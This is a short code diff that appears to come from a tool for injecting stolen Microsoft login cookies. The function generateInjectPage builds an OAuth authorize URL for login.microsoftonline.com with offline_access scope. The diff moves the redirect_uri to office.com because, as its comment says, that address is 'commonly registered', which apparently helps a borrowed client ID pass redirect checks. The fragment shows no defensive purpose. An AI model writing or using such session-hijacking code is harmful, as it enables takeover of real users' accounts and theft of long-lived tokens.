@@ -284,9 +284,8 @@ function generateInjectPage(cookies, clientId, tenant) {
 
   var baseDomain = tenant && tenant !== 'common' ? '.' + tenant + '.login.microsoftonline.com' : '.login.microsoftonline.com';
 
-  // Build tenant suffix properly - avoid duplicate "common/common"
-  var tenantSuffix = (tenant && tenant !== 'common') ? '.' + tenant : 'login.microsoftonline.com';
-  var authUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=' + clientId + '&response_type=code&redirect_uri=https://localhost/&scope=openid+profile+email+offline_access';
+  // Build auth URL - use https://www.office.com/ as redirect_uri since it's commonly registered
+  var authUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=' + clientId + '&response_type=code&redirect_uri=https%3A%2F%2Fwww.office.com%2F&scope=openid+profile+email+offline_access';
   var navTargets = [
     authUrl,
     'https://login.microsoftonline.com/',
